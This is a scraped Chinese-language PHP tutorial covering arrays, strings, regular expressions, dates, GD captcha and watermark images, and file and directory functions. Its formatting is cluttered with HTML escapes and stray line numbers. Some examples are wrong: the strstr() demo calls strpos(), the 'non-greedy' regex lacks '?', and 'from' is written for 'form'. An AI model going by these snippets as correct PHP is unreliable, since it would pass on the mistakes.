实行方便，直接在URL中使用 缺点: 正因为实行方便，直接写在URL中，所以这反而不安全，而且在URL中只能用英文 2.post方式 $_POST &lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; &lt;title&gt;预定义全局变量&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;from method&#x3D;&quot;post&quot;&gt; 姓名:&lt;input type&#x3D;&quot;text&quot; name&#x3D;&#39;username&#39; &#x2F;&gt;&lt;br &#x2F;&gt; 性别:&lt;input type&#x3D;&quot;text&quot; name&#x3D;&#39;sex&#39; &#x2F;&gt;&lt;br &#x2F;&gt; &lt;&#x2F;from&gt; &lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455处理数组的相关函数这只是其中一部分，通过学习下面一部分，来了解如何使用处理数组的相关函数 1) array_count_values &#x2F;&#x2F; 统计数组中所有的值出现的次数 array array_count_values(array $input) 实例: $array &#x3D; array(1,&quot;hello&quot;,1,&quot;world&quot;,&quot;hello&quot;); print_r(array_count_values ($array)); print_r($array) &#x2F;&#x2F; 原来的数组不会受到任何影响 结果: &#x2F;&#x2F; 1 在数组中出现了2次，hello出现了2 次，world出现了1次 Array ( [1]&#x3D;&gt;2 [hello]&#x3D;&gt;2 [world]&#x3D;&gt;1 ) 2) array_key_exists &#x2F;&#x2F; 查看给定的键值或索引是否存在与数组中 实例: $search_array &#x3D; array(&#39;first&#39; &#x3D;&gt; 1 , &#39;second&#39; &#x3D;&gt; 4); if(array_key_exists(&#39;first&#39;,$search_array))&#123; echo &quot;The &#39;first&#39; element is in the array&quot;; &#125; 结果: The &#39;first&#39; element is in the array 3) array_search &#x2F;&#x2F;在数组中搜索给定的值，如果成功则返回相应的键名 $array &#x3D; array(0 &#x3D;&gt; &#39;blue&#39;, 1 &#x3D;&gt; &#39;red&#39;,2 &#x3D;&gt;&#39;green&#39;,3&#x3D;&gt;&#39;red&#39;,4&#x3D;&gt;15); &#x2F;&#x2F; 可以加入true来判断中&#39;15&#39;有没有,虽然上面有15但是类型不同,一个int一个str &#x2F;&#x2F; 如果不加true不比较类型，只比较大小是够相等，返回了键4 var_dump(array_search(&#39;15&#39;,$array,true)); &#x2F;&#x2F; key &#x3D; 2 返回false,类型不同 var_dump(array_search(&#39;red&#39;,$array)); &#x2F;&#x2F; key &#x3D; 1 4) count &#x2F;&#x2F; 计算数组中的单元数目或对象中的属性个数 &#x2F;&#x2F; $array变量中有两个值 $array &#x3D; array(0 &#x3D;&gt; &#39;blue&#39;, 1 &#x3D;&gt; &#39;red&#39;); var_dump(count($array)); &#x2F;&#x2F; 返回结果是 int(2) 5) in_array &#x2F;&#x2F; 检查数组中是否存在某个值 $os &#x3D; array(&#39;Mac&#39;,&#39;NT&#39;,&#39;Irix&#39;,&#39;Linux&#39;); var_dump(in_array(&#39;Mac&#39;,$os)); 6) list &#x2F;&#x2F; 把数组中的值赋给一些变量 list()仅能用于数字索引的数组 格式: $arr&#x3D;array(索引值); list(变量名)&#x3D;$arr; echo 变量名 ; 实例: $arr&#x3D;array(60,70,80); list($Sun,$Liu,$Zhang)&#x3D;$arr; echo $Zhang; &#x2F;&#x2F; 结果是 80 7) asort &#x2F;&#x2F; 对数组进行排序保持索引关系 $frults &#x3D; array(&quot;c&quot;&#x3D;&gt;60,&quot;a&quot;&#x3D;&gt;90,&quot;b&quot;&#x3D;&gt;30); asort($frults); print_r($frults); 直接对数组里面的数据进行排序 字符串处理123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475一、去除空格或其他字符1、trim()函数 去除空格 $str &#x3D;&#39; abc &#39;; var_dump($str); var_dump(trim($str)); 去除其他空格 $str &#x3D;&#39;aabca&#39;; var_dump($str); var_dump(trim($str,&#39;a&#39;));2、ltrim() 去除左边字符3、rtrim() 去除右边字符二、大小写转换函数1、strtoupper() 将字母大写 $a &#x3D; &#39;test&#39;; var_dump($a); var_dump(strtoupper($a));2、strtolower() 方法同上 三、字符串查找函数1、substr_count() 计算字符串出现的次数 $str&#x3D;&#39;teteastetasd&#39;; var_dump(substr_count($str,&#39;te&#39;)); &#x2F;&#x2F;可以再查找的字符串后面加上起始值和结束值2、strpos() 查找字符串首次出现的位置 $str&#x3D;&#39;teteastetasd&#39;; var_dump(strpos($str,&#39;as&#39;)); &#x2F;&#x2F;返会结果是 43、strstr() 返回字符串首次出现的位置并将后面的字符全部输出 $str&#x3D;&#39;teteastetasd&#39;; var_dump(strpos($str,&#39;as&#39;)); &#x2F;&#x2F;返回结果 astetasd四、字符串替换函数 1、str_replace 字符串替换 替换多个字符 $str&#x3D;&#39;teteastetasd&#39;; $str1&#x3D;str_replace(array(&#39;e&#39;,&#39;a&#39;,&#39;s&#39;),array(&#39;E&#39;,&#39;A&#39;,&#39;S&#39;),$str); var_dump($str1);五、与html标签相关的函数1、htmlspecialchars() $str&#x3D;&lt;&lt;&lt;START &lt;p style&#x3D;&quot;color:red;fonts-size:28px;&quot;&gt;单位确定为取得完全&lt;&#x2F;p&gt; START; echo $str; echo &quot;\\n&quot;; echo htmlspecialchars($str);2、strip_tags() 从字符串中去除HTML和PHP标记 $str&#x3D;&lt;&lt;&lt;START &lt;p style&#x3D;&quot;color:red;fonts-size:28px;&quot;&gt;单位确定为取得完全&lt;&#x2F;p&gt; START; echo $str; echo &quot;\\n&quot;; echo strip_tags($str);六、字符串截取函数1、substr() 截取函数 $str&#x3D;&#39;teaeatewfsdf&#39;; echo substr($str,1); &#x2F;&#x2F;将t给截取了七、字符串分割函数1、explode() 用其中的一个字符来分割 $str&#x3D;&#39;test,test1,test2,test3&#39;; var_dump(explode(&#39;,&#39;,$str));2、str_split() 将一个字符串转换为数组 $str &#x3D; &#39;Hello&#39;; var_dump(str_split($str)); &#x2F;&#x2F;输出结果是 数组格式 将字符中长度是3的输出，这里输出的结果就是hel lo是因为字符长度不足，输出出来的。 $str &#x3D; &#39;Hello&#39;; var_dump(str_split($str,3)); 正则表达式1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283一、正则表达式语法规则 正则表达式描述了一类字符串的特征，通过这个特征与特定的函数配合，对其他的字符串进行匹配、查找、替换及分割操作！ 这类字符串的特征是由一个或多个 1、普通字符(比如a到z)、 2、元字符(有特殊功能的字符比如*、+、?等), 组成的一个字符串！ 例如&#39;&#x2F;a&#x2F;&#39;,a就是普通字符，&#x2F;是定界符(表示正则表达式开始或结束)。 preg_match_all()&#x2F;&#x2F;按指定的正则表达式，在给定的字符串中进行搜索，匹配到复合特征的部分取出来&#x2F;&#x2F; 用正则表达式指定一个特征 $pattern&#x3D;&#39;&#x2F;test&#x2F;&#39;;&#x2F;&#x2F; 新建一个变量，里面存入字符串，上面的特种会查找当前字符串有没有相同的，有则输出 $str&#x3D;&#39;testidhiashtestewofoitest&#39;;&#x2F;&#x2F; 第一个变量就是指定得正则，第二个变量就是要查找的字符串，第三个变量是将你匹配的字符串查找出来，并且赋值给第三个变量 preg_match_all($pattern,$str,$varr); var_dump(preg_match_all($pattern,$str,$varr)); var_dump($varr);二、定界符 我们一般用正斜杠&#x2F;作为定界符的字符 除了字母、数字、和正斜线以外的字符都可以作为定界符，比如 # ! &#123;&#125; | 都可以 定界符放在正则表达式起始位置，前后一致！ 三、普通字符 比如:a-z、A-Z、0-9、双引号、单引号，他们没有特殊的含义 &#x2F;* 元字符 \\d 代表0-9之中的任意一个字符， 注意是 一个 字符，如果两个的话就不行了 \\D 匹配除了0-9之外的任意一个字符，注意是 一个 字符，如果两个的话就不行了 \\s 匹配任意一个空白字符，比如换页符、换行符、回车符、制表符、垂直制表符 \\S 匹配除了空白字符以外的任何一个字符 \\w 匹配任意一个数字或字母或下划线 \\W 匹配除数字、字母、下划线以外的任意一个字符 . 匹配除换行符以外的任意一个字符 * 匹配0次、或者1次、或多次 + 匹配1次或多次其前面的字符 ? 匹配0次或1次其前面的字符 &#123;n&#125; 表示其前面字符恰好出现n次 &#123;n,&#125; 表示前面字符出现不少于n次 &#123;n,m&#125; 表示前面字符至少出现n次，最多出现m次 ^或\\A 匹配字符串开始位置 $或者\\Z 匹配字符串的结束位置 | 匹配两个或多个模式 [] 匹配方括号中的任意一个字符 [^] 匹配除方括号中字符以外的任意一个字符 () 将括号中作为一个整体以便将其中的内容获取到 在我们的正则表达式中，可以使用圆括号来将某一段括起来，在圆括号的后面部分我们可以使用 \\\\数字 来代表圆括号部分所匹配的内容 &#x2F;* ()将括号中作为一个整体以便将其中的内容获取到 在我们的正则表达式中 可以使用圆括号来将某一段括起来，在圆括号的后面部分，我们可 以使用 \\\\数字 来代表圆括号部分所匹配到的内容 *&#x2F; $pattern&#x3D;&#39;&#x2F;t(e)st\\\\1&#x2F;&#39;;&#39;\\\\1就代表第一个圆括号部分所匹配到的内容&#39; &#x2F;&#x2F; 在()里面，匹配到什么\\\\1就要跟什么，不能和()的 $str&#x3D;&#39; teste &#39;; var_dump(preg_match_all($pattern,$str,$varr)); var_dump($varr); *&#x2F; &#x2F;&#x2F; 在搜索的时候因为你是在te和st中间插入的\\d所以只能在$str里面找te到st中间有数字的 &#x2F;&#x2F; 例如: te0-9st只要其中一个数字都可以，但是如果tes0-9t,在这个位置或者以外的位置,、 将搜索不到。 $pattern&#x3D;&#39;&#x2F;te\\dst&#x2F;&#39;; $str&#x3D;&#39;testidhtesteite1st&#39;; var_dump(preg_match_all($pattern,$str,$varr)); var_dump($varr); &#x2F;&#x2F;除了0-9之外都能匹配 $pattern&#x3D;&#39;&#x2F;te\\Dst&#x2F;&#39;; $str&#x3D;&#39;testidhteTsteite1st&#39;; var_dump(preg_match_all($pattern,$str,$varr)); var_dump($varr); 12345678910111213141516&#x2F;* .和*匹配 .*配合使用默认情况下是 贪婪匹配(尽可能多的匹配)*&#x2F;$pattern&#x3D;&#39;&#x2F;te.*st&#x2F;&#39;; $str&#x3D;&#39;testidhteTsteite1st&#39;; var_dump(preg_match_all($pattern,$str,$varr)); var_dump($varr); &#x2F;* .*后面加上一个?可以解决贪婪匹配问题，非贪婪匹配*&#x2F;$pattern&#x3D;&#39;&#x2F;te.*st&#x2F;&#39;; $str&#x3D;&#39;testidhteTsteite1st&#39;; var_dump(preg_match_all($pattern,$str,$varr)); var_dump($varr); 模式修正符123456789101112模式修正符是在正则表达式的定界符之后使用的，可以调整正则表达式的解释，扩展正则表达式在匹配、替换等操作时的某些功能，增强正则表达式的处理能力| 在和模式进行匹配时不区分大小写m 多行匹配，如果目标字符串中没有&quot;\\n&quot;字符，或者正则表达式中没有出现^或$，设置这个修饰符不产 生任何影响s 如果设定了此修正符，那么将匹配所有的字符包括换行符U 禁止贪婪匹配模式修正符他是可以搭配使用的，可以使用多个$pattern&#x3D;&#39;&#x2F;test&#x2F;i&#39;;$str &#x3D; &#39; test TEST Test TeSt &#39;;var_dump(preg_match_all($pattern,$str,$arr));var_dump($arr); 与正则表达式配合的函数12345678910111213141516171819202122232425262728293031323334353637383940414243444546最常用的匹配函数 1、preg_match() &#x2F;&#x2F;执行一个正则表达式匹配，返回值0次或者1次 参数说明： 第一个参数：正则表达式 第二个参数：目标字符串 第三个参数：放一个变量，执行完成之后，里面会有匹配到的部分以及等等一些数据。 第四个参数：可以传PREG_OFFSET_CAPTURE进入(那么第三个参数那个变量里面的数据就会有匹配到的部分的偏移值)，默认是0 第五个参数：可以传一个值，来表示从目标字符串的哪个位置开始匹配（单位是字节）。 $pattern &#x3D; &#39;&#x2F;t(.*?)st&#x2F;&#39;; $str &#x3D; &#39; test tadasst &#39;; if(preg_match($pattern,$str))&#123; echo &#39;找到了&#39;; &#125;else&#123; echo &#39;没找到&#39;; &#125; &#x2F;&#x2F;var_dump($arr); 2、preg_match_all() &#x2F;&#x2F; 按指定的正则表达式，在给定的字符串中进行搜索，匹配到复合特征的部分取出来 $pattern &#x3D; &#39;&#x2F;t(.*?)st&#x2F;&#39;; $str &#x3D; &#39; test tadasst &#39;; var_dump(preg_match_all($pattern,$str,$arr)); var_dump($arr); 结果: array (size&#x3D;2) 0 &#x3D;&gt; array (size&#x3D;2) 0 &#x3D;&gt; string &#39;test&#39; (length&#x3D;4) 1 &#x3D;&gt; string &#39;tadasst&#39; (length&#x3D;7) 1 &#x3D;&gt; array (size&#x3D;2) 0 &#x3D;&gt; string &#39;e&#39; (length&#x3D;1) 1 &#x3D;&gt; string &#39;adas&#39; (length&#x3D;4) 3、preg_replace() &#x2F;&#x2F;执行一个正则表达式的搜索和替换 参数说明: 第一个参数:正则表达式 第二个参数:要替换成的字符串 第三个参数:目标字符串 第四个参数:默认是-1，就是替换所有符合特征部分的 $pattern &#x3D; &#39;&#x2F;(.*?)&#x2F;&#39;; $str &#x3D; &#39;\\\\1&#39;; $str1 &#x3D; &#39;saiudhdstest&#39;; var_dump(preg_replace($pattern,$str,$str1)); var_dump($str1); 日期与时间123456789101112131415161718192021222324252627282930313233343536373839一、设置时区 默认的时区是UTC date_default_timezone_set(&#39;Asia&#x2F;Shanghai&#39;);二、获取当前Unix时间戳 Unix时间戳 从Unix纪元(格林威治时间1970年1月1日00时00分00秒)开始到当前的秒数 time();三、获取指定时间的Unix时间戳 mktime(); &#x2F;&#x2F;顺序是，时,分,秒,月,日,年 var_dump(mktime(0,0,0,10,1,2015)); 还可以 $nowtime&#x3D;time();&#x2F;&#x2F;获取Unix时间戳 &#x2F;&#x2F;顺序是，时,分,秒,月,日,年 $mktime1&#x3D;mktime(0,0,0,10,1,2020); echo &#39;距离2020年国庆还有&#39;.(($mktime1-$nowtime)&#x2F;60&#x2F;60&#x2F;24).&#39;天&#39;; 四、从Unix时间戳取得时间日期信息&#x2F;&#x2F;格式化一个本地时间&#x2F;日期 date(); 第一个参数：必填，自己定义时间日期格式 var_dump(date(&#39;Y-m-d G:i:s&#39;));五、获取Unix时间戳和微秒数&#x2F;&#x2F;返回当前Unix时间戳和微秒数 microtime(); var_dump(microtime()); var_dump(microtime(true)); 可以用于查看程序运行时间 例如for循环 &#x2F;&#x2F;round();函数是显示小数点后几位 $start&#x3D;microtime(true); for ($i&#x3D;0;$i&lt;100000;$i++)&#123; &#125; $end&#x3D;microtime(true); echo &#39;循环用了&#39;.round(($end-$start),3).&#39;秒&#39;; 图像处理12345678创建一个图像应该完成如下所示的四个基本步骤1、创建图像 所有的绘图设计都需要在一个图像上完成，以后的操作都将基于这个图像2、绘制图像 图像创建完成以后，就可以通过这个图像资源，使用各种画像函数设置图像的颜色、填充画布、画 点、线段、各种几何图形，以及向图像的添加文本等3、输出图像 完成整个图像的绘制之后，需要将图像以某个格式保存到服务器的文件中，或者将图像直接输出到浏 览器上显示给用户。但在图像输出之前一定要是用header()函数发送Content-type通知浏览器， 这次发送的是图片不是文本4、释放资源 123456789101112131415161718192021222324252627282930313233343536373839一、创建图像imagecreatetruecolor(); 创建一个真彩色图像 实例: $img &#x3D; imagecreatetruecolor(200,200);二、绘制图像 $color1&#x3D;imagecolorallocate($img,50,120,200);&#x2F;&#x2F;分配颜色 $color2&#x3D;imagecolorallocate($img,46,219,50);三、输出图像 header函数注意点 在header函数之前不能输出任何内容，包括空格，空字符串等四、释放资源imagedestroy() &#x2F;&#x2F;销毁图片实例整体:&#x2F;&#x2F;不使用header浏览器不知道你要输出的什么会乱码，&#x2F;&#x2F;NetWork里面显示,Content-Type:test&#x2F;html&#x2F;&#x2F;使用header更改格式，底下用的imagejpeg所以更改为image传输为jpeg header(&#39;Content-Type:image&#x2F;jpeg&#39;); $img &#x3D; imagecreatetruecolor(200,200);&#x2F;&#x2F;创建一个长和高都为200像素的真彩色图像 $color1&#x3D;imagecolorallocate($img,50,120,200);&#x2F;&#x2F;分配颜色 $color2&#x3D;imagecolorallocate($img,46,219,50); imagefill($img,0,0,$color2); imagejpeg($img);另存为图片&#x2F;&#x2F;将之前的image&#x2F;jpeg改为原本的text&#x2F;html header(&#39;Content-Type:text&#x2F;html charset&#x3D;UFT-8&#39;); $img &#x3D; imagecreatetruecolor(200,200);&#x2F;&#x2F;创建一个长和高都为200像素的真彩色图像 $color1&#x3D;imagecolorallocate($img,50,120,200);&#x2F;&#x2F;分配颜色 $color2&#x3D;imagecolorallocate($img,46,219,50); imagefill($img,0,0,$color2);&#x2F;&#x2F;在这里加一个相对路径就是要保存的位置 if(imagejpeg($img,&#39;images&#x2F;sunwukong.jpeg&#39;))&#123; &#x2F;&#x2F;保存图片 echo &#39;保存成功&#39;; &#125; imagedestroy($img); 1绘制图像 验证码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php$witch&#x3D;120;$height&#x3D;60;&#x2F;&#x2F; 更改格式，否则报错header(&#39;Content-Type:image&#x2F;jpeg&#39;);&#x2F;&#x2F; 设置随机数，使用.将其连接$string&#x3D;&#39;&#39;;for($i&#x3D;0;$i&lt;4;$i++)&#123; $element&#x3D;array(&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;,&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;,&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;); $string.&#x3D;$element[rand(0,count($element)-1)];&#125;&#x2F;&#x2F; 创建一个真彩图像$img &#x3D; imagecreatetruecolor($witch,$height);&#x2F;&#x2F; 填充颜色$col1&#x3D;imagecolorallocate($img,rand(20,255),rand(20,255),rand(20,255));$col2&#x3D;imagecolorallocate($img,rand(200,255),rand(200,255),rand(200,255));$col3&#x3D;imagecolorallocate($img,rand(20,255),rand(20,255),rand(20,255));&#x2F;&#x2F; 填充区域$fill &#x3D; imagefill($img,0,0,$col1);imagerectangle($img,0,0,$witch-1,$height-1,$col2);&#x2F;&#x2F; 创建单一像素进行循环for($i&#x3D;0;$i&lt;&#x3D;100;$i++)&#123; imagesetpixel($img,rand(0,$witch-1),rand(0,$height-1), imagecolorallocate($img,rand(20,255),rand(20,255),rand(20,255)));&#125;&#x2F;&#x2F; 创建线段，进行循环for($i&#x3D;0;$i&lt;&#x3D;3;$i++)&#123; imageline($img,rand(0,$witch&#x2F;2),rand(0,$height), rand($witch&#x2F;2,$witch),rand(0,$height), imagecolorallocate($img,rand(20,255),rand(20,255),rand(20,255)));&#125;&#x2F;&#x2F; 向图像中创建字符串&#x2F;&#x2F; imagestring($img,5,0,0,&#39;abcd&#39;,$col3);imagettftext($img,25,rand(2,25),rand(30,50),rand(30,$height),$col3,&#39;font&#x2F;ITCBLKAD.TTF&#39;,$string);imagejpeg($img); 1234水印1、创建新的 imagecreatetruecolor() 2、打开服务器或网络文件中已经存在的GIF,JPEG,PNG,WBMP格式图像 1234567891011121314文字水印header(&#39;Content-type:image&#x2F;jpg&#39;);$img &#x3D; imagecreatefromjpeg(&#39;picture&#x2F;Pu.jpg&#39;);$color&#x3D;imagecolorallocate($img,120,55,42);$width&#x3D;imagesx($img);$height&#x3D;imagesy($img);$position&#x3D;imagettfbbox(20,0,&#39;picture&#x2F;chinese1.TTF&#39;,&#39;笛声&#x2F;悠扬&#39;);$length&#x3D;$position[2]-$position[0];imagettftext($img,20,0,$width-1-$length-($width&#x2F;5),$height-1-($height&#x2F;30),$color,&#39;picture&#x2F;chinese1.TTF&#39;,&#39;笛声&#x2F;悠扬&#39;);imagejpeg($img);imagedestroy($img); 1234567891011121314151617181920212223242526272829303132图片和文字水印header(&#39;Content-type:image&#x2F;jpg&#39;);$img &#x3D; imagecreatefromjpeg(&#39;picture&#x2F;Pu.jpg&#39;);$mark&#x3D;imagecreatefromgif(&#39;picture&#x2F;minalt.gif&#39;);$color&#x3D;imagecolorallocate($img,120,55,42);$width&#x3D;imagesx($img);$height&#x3D;imagesy($img);$markWidth&#x3D;imagesx($mark);$markHeight&#x3D;imagesy($mark);$position&#x3D;imagettfbbox(20,0,&#39;picture&#x2F;chinese1.TTF&#39;,&#39;笛声&#x2F;悠扬&#39;);$length&#x3D;$position[2]-$position[0];&#x2F;&#x2F; 文字水印imagettftext($img,20,0,$width-1-$length-($width&#x2F;30),$height-1-($height&#x2F;30),$color,&#39;picture&#x2F;chinese1.TTF&#39;,&#39;笛声&#x2F;悠扬&#39;);&#x2F;*参数说明： $img：目标图像资源 $wateMake：水印的图像资源 100：所要拷贝到目标图像资源上面的坐标(x轴的位置) 100：所要拷贝到目标图像资源上面的坐标(y轴的位置) 0：从水印图像资源的x坐标为0的位置开始拷贝 0：从水印图像资源的y坐标为0的位置开始拷贝 $wateWidth：所要拷贝水印图像的长度 $wateHeight：所要拷贝水印图像的宽度*&#x2F;imagecopy($img,$mark,100,100,0,0,$markWidth,$markHeight);imagejpeg($img);imagedestroy($img); 1234567891011121314151617181920212223242526272829303132333435363738更改图片透明度header(&#39;Content-type:image&#x2F;jpg&#39;);$img &#x3D; imagecreatefromjpeg(&#39;picture&#x2F;xihu.jpg&#39;);$mark&#x3D;imagecreatefrompng(&#39;picture&#x2F;xiao.png&#39;);$color&#x3D;imagecolorallocate($img,120,55,42);$width&#x3D;imagesx($img);$height&#x3D;imagesy($img);$markWidth&#x3D;imagesx($mark);$markHeight&#x3D;imagesy($mark);$position&#x3D;imagettfbbox(20,0,&#39;picture&#x2F;chinese1.TTF&#39;,&#39;笛声&#x2F;悠扬&#39;);$length&#x3D;$position[2]-$position[0];&#x2F;&#x2F; 文字水印imagettftext($img,20,0,$width-1-$length-($width&#x2F;30),$height-1-($height&#x2F;30),$color,&#39;picture&#x2F;chinese1.TTF&#39;,&#39;笛声&#x2F;悠扬&#39;);&#x2F;*参数说明： $img：目标图像资源 $wateMake：水印的图像资源 100：所要拷贝到目标图像资源上面的坐标(x轴的位置) 100：所要拷贝到目标图像资源上面的坐标(y轴的位置) 0：从水印图像资源的x坐标为0的位置开始拷贝 0：从水印图像资源的y坐标为0的位置开始拷贝 $wateWidth：所要拷贝水印图像的长度 $wateHeight：所要拷贝水印图像的宽度 0：代表透明度，数字越小越透明，100的时候相当于 imagecopy*&#x2F;&#x2F;&#x2F;imagecopy($img,$mark,800,500,0,0,$markWidth,$markHeight);&#x2F;&#x2F; 可以更改透明度imagecopymerge($img,$mark,800,500,0,0,$markWidth,$markHeight,0);imagejpeg($img);imagedestroy($img); 缩放与裁剪1234567891011121314151617181920212223242526272829303132333435363738&#x2F;* 等比例缩放*&#x2F;header(&#39;Content-type:image&#x2F;jpeg&#39;);$width&#x3D;500;$img&#x3D;imagecreatefromjpeg(&#39;picture&#x2F;xihu.jpg&#39;);$imgWidth&#x3D;imagesx($img);$imgHeight&#x3D;imagesy($img);$height&#x3D;$width&#x2F;($imgWidth&#x2F;$imgHeight);$target&#x3D;imagecreatetruecolor($width,$height);&#x2F;*imagecopyresampled(1,2,3,4,5,6,7,8,9,10)函数中的参数 1、目标图像资源 2、原图像资源(需要采样的那个图像资源) 3、目标图像资源坐标位置(x)轴 4、目标图像资源坐标位置(y)轴(与3一样确定了一个坐标,把采样到的部分，放到目标图像资源的什么位置) 5、原图像资源坐标位置(x)轴 6、原图像资源坐标位置(y)轴(你要残阳的原图像资源的某个部分的起始坐标() 7、目标长度 8、目标高度(确定了放到目标图像资源上面的尺寸) 9、原图像长度 10、原图像高度(确定了采样原图像资源的某个部分)*&#x2F;imagecopyresampled($target,$img,0,0,0,0,$width,$height,$imgWidth,$imgHeight);&#x2F;&#x2F; 裁剪&#x2F;&#x2F; imagecopyresampled($target,$img,0,0,0,0,100,100,100,100);if(imagejpeg($target))&#123; imagejpeg($target,&#39;picture&#x2F;xxhh.jpg&#39;);&#125;imagedestroy($img);imagedestroy($target); 文件与目录操作目录的基本操作1任何数据类型变量所有存储的数据，都是在程序运行时才加载到内存中的，而不能持久保存，那么如果需要将数据长久的保存起来，有两种方法，保存到普通文件中或者保存到数据中，我们的PHP可以在我们的服务器上生成目录、创建、编辑、删除、修改文件属性等操作 一、判断普通文件和目录1234561、is_file() &#x2F;&#x2F; 判断给定的文件名是否为一个正常的文件 实例： var_dump(is_file(&#39;index.php&#39;));2、is_dir() &#x2F;&#x2F; 判断给定文件名是否是一个目录 实例： var_dump(is_dir(&#39;..&#x2F;demo5&#x2F;&#39;)); 二、文件的属性 12345678910111213141516171819202122232425262728293031323334353637383940414243file_exists() &#x2F;&#x2F; 检查文件或目录是否存在 实例: &#x2F;&#x2F; 检查文件 $sum &#x3D; &#39;index.php&#39;; if(file_exists($sum))&#123; echo &#39;true&#39;.&#39;&lt;br &#x2F;&gt;&#39;; &#125;else&#123; echo &#39;false&#39;.&#39;&lt;br &#x2F;&gt;&#39;; &#125; &#x2F;&#x2F; 检查目录 $sum &#x3D; &#39;..&#x2F;demo5&#x2F;&#39;; if(file_exists($sum))&#123; echo &#39;true&#39;; &#125;else&#123; echo &#39;false&#39;; &#125;filesize() &#x2F;&#x2F; 取得普通文件的大小 实例： $filename&#x3D;&#39;index.php&#39;; &#x2F;&#x2F; 想要将字节转换成MB需要&#x2F;1024&#x2F;1024 除两次1024 echo $filename.&#39;:&#39;.filesize($filename).&#39;bytes&#39;; &#x2F;&#x2F; 如果可写，可读返回true is_readable() &#x2F;&#x2F; 判断文件是否可读 实例: var_dump(is_readable(&#39;index.php&#39;)); is_writable() &#x2F;&#x2F; 判断文件是否可写 实例: var_dump(is_writeable(&#39;index.php&#39;)); filectime(); &#x2F;&#x2F; 获取文件创建时间 实例: date_default_timezone_set(&#39;Asia&#x2F;Shanghai&#39;); echo date(&#39;Y-m-d G:i:s&#39;,filectime(&#39;index.php&#39;)); filemtime() &#x2F;&#x2F; 获取文件修改时间 实例： date_default_timezone_set(&#39;Asia&#x2F;Shanghai&#39;); echo date(&#39;Y-m-d G:i:s&#39;,filemtime(&#39;index.php&#39;)); 三、目录的基本操作 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364651、basename(); &#x2F;&#x2F; 返回路径中的文件名部分 实例： date_default_timezone_set(&#39;Asia&#x2F;Shanghai&#39;); &#x2F;&#x2F; 返回当前文件绝对路径 echo __FILE__.&#39;&lt;br &#x2F;&gt;&#39;; &#x2F;&#x2F; 使用basename只返回文件名 echo basename(__FILE__); 2、dirname(); &#x2F;&#x2F; 返回路径中的目录部分 实例: date_default_timezone_set(&#39;Asia&#x2F;Shanghai&#39;); echo __FILE__.&#39;&lt;br &#x2F;&gt;&#39;; &#x2F;&#x2F; 使用dirname返回路径中的目录部分，只显示到目录 echo dirname(__FILE__).&#39;&lt;br &#x2F;&gt;&#39;; 3、pathinfo(); &#x2F;&#x2F; 返回路径中的信息 实例： date_default_timezone_set(&#39;Asia&#x2F;Shanghai&#39;); echo __FILE__.&#39;&lt;br &#x2F;&gt;&#39;; &#x2F;&#x2F; 以数组的形式输出 var_dump(pathinfo(__FILE__)).&#39;&lt;br &#x2F;&gt;&#39;; 4、opendir(); &#x2F;&#x2F; 打开目录句柄，也可以叫目录资源5、deaddir(); &#x2F;&#x2F; 读取目录句柄的条目，返回目录中下一个文件的文件名 实例： date_default_timezone_set(&#39;Asia&#x2F;Shanghai&#39;); $dir &#x3D; opendir(&#39;..&#x2F;demo5&#39;); for($i&#x3D;0;$i&lt;&#x3D;3;$i++)&#123; var_dump(readdir($dir)); &#125; 6、rewinddir();(了解) &#x2F;&#x2F; 倒回目录句柄 实例： date_default_timezone_set(&#39;Asia&#x2F;Shanghai&#39;); $dir &#x3D; opendir(&#39;..&#x2F;demo5&#39;); for($i&#x3D;0;$i&lt;&#x3D;2;$i++)&#123; var_dump(readdir($dir)); &#125; rewinddir($dir); var_dump(readdir($dir));7、closedir(); &#x2F;&#x2F; 关闭目录句柄 实例： &#x2F;&#x2F; 返回false closedir($dir); var_dump(readdir($dir)); 8、mkdir(); &#x2F;&#x2F; 新建目录 实例： &#x2F;&#x2F; 创建文件夹 var_dump(mkdir(&#39;file&#39;)); &#x2F;&#x2F; 设置文件夹最高权限，0777代表linux中r-w-x，4-2-1 var_dump(mkdir(&#39;file&#39;,0777)); &#x2F;&#x2F; 加上true可以创建多层目录 var_dump(mkdir(&#39;file1&#x2F;liux&#x2F;r-w-x&#39;,0777,true));9、rmdir(); &#x2F;&#x2F; 删除指定的空目录 实例： var_dump(rmdir(&#39;demo5&#x2F;file1&#39;)); 10、scandir(); &#x2F;&#x2F; 列出指定路径中的文件和目录 实例： var_dump(scandir(&#39;..&#x2F;demo5&#39;)); 四、文件的基本操作 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364651、fopen(); &#x2F;&#x2F; 打开文件或者URL2、fread(); &#x2F;&#x2F; 读取文件 实例： header(&#39;Content-type:text&#x2F;html;charset&#x3D;utf-8&#39;); $file&#x3D;fopen(&#39;test.txt&#39;,&#39;r&#39;); var_dump(fread($file,3)); 3、fgets(); &#x2F;&#x2F; 从文件指针中读取一行 实例： header(&#39;Content-type:text&#x2F;html;charset&#x3D;utf-8&#39;); $file&#x3D;fopen(&#39;test.txt&#39;,&#39;r&#39;); var_dump(fgets($file,3));4、feof(); &#x2F;&#x2F; 测试文件指针是否到了文件结束位置 实例 $file&#x3D;fopen(&#39;test.txt&#39;,&#39;r&#39;); for($i&#x3D;0;$i&lt;&#x3D;10;$i++)&#123; var_dump(fgets($file)); &#125; var_dump(feof($file)); 5、fwrite(); &#x2F;&#x2F; 写入文件 实例: $file&#x3D;fopen(&#39;test.txt&#39;,&#39;r+&#39;); var_dump(fwrite($file,&#39;龙傲九天&#39;)); 